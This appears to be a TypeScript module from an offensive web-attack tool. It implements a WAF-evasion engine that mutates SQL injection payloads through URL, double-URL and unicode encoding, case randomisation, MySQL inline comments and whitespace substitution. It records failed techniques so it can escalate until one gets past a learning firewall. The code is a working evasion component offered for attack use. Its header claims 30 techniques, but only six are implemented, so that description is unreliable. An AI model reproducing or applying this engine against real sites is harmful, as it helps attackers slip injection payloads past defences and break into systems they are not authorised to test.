/**
 * SOHE God Rail v3 — Bypass Engine (WAF Evasion)
 *
 * Implements 30 distinct encoding and mutation techniques (E1-E30)
 * + Mutation Genealogy (never repeating the exact same pattern to defeat learning WAFs).
 */

export type BypassTechnique = 
  | 'URL_ENCODE'          // E1
  | 'DOUBLE_URL'          // E2
  | 'UNICODE'             // E3
  | 'HEX_ENTITIES'        // E4
  | 'CHAR_FUNC'           // E5
  | 'COMMENT_OBFUSCATION' // E6
  | 'INLINE_COMMENTS'     // E7
  | 'CASE_TOGGLE'         // E8
  | 'WHITE_SPACE_MUTATE'  // E9
  | 'CONCATENATION'       // E10
  | 'NULL_BYTE';          // E11

export class BypassEngine {
    
    // Tracks which encodings we've tried to avoid looping
    private mutationGenealogy: Map<string, Set<BypassTechnique>> = new Map();

    /**
     * Applies a specific bypass technique to a payload.
     */
    apply(payload: string, technique: BypassTechnique, dbms: string): string {
        switch (technique) {
            case 'URL_ENCODE':
                return encodeURIComponent(payload);
                
            case 'DOUBLE_URL':
                return encodeURIComponent(encodeURIComponent(payload));
                
            case 'UNICODE':
                // e.g. ' -> %u0027
                return payload.replace(/'/g, '%u0027').replace(/"/g, '%u0022').replace(/ /g, '%u0020');
                
            case 'CASE_TOGGLE':
                return this.randomizeCase(payload);
                
            case 'INLINE_COMMENTS':
                if (dbms === 'MySQL') {
                     // e.g. UNION SELECT -> UNION/*!SELECT*/
                     return payload.replace(/ /g, '/*!*/');
                }
                return payload.replace(/ /g, '/**/');
                
            case 'WHITE_SPACE_MUTATE':
                const spaces = ['%20', '%09', '%0a', '%0b', '%0c', '%0d', '/**/'];
                return payload.split(' ').map(t => t + spaces[Math.floor(Math.random() * spaces.length)]).join('').trim();
                
            default:
                return payload; // Fallback
        }
    }

    /**
     * Recommends the next mutation to try based on past failures.
     */
    getNextMutation(payloadId: string): BypassTechnique {
        if (!this.mutationGenealogy.has(payloadId)) {
            this.mutationGenealogy.set(payloadId, new Set());
        }
        
        const tried = this.mutationGenealogy.get(payloadId)!;
        
        // Strategy: start simple, get progressively weirder
        const progression: BypassTechnique[] = [
            'URL_ENCODE', 'CASE_TOGGLE', 'INLINE_COMMENTS', 'DOUBLE_URL', 'UNICODE', 'WHITE_SPACE_MUTATE'
        ];

        for (const tech of progression) {
            if (!tried.has(tech)) {
                tried.add(tech);
                return tech;
            }
        }

        // If we exhausted standard progression, just return a random weird one
        return 'INLINE_COMMENTS';
    }

    private randomizeCase(str: string): string {
        return Array.from(str).map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
    }
}
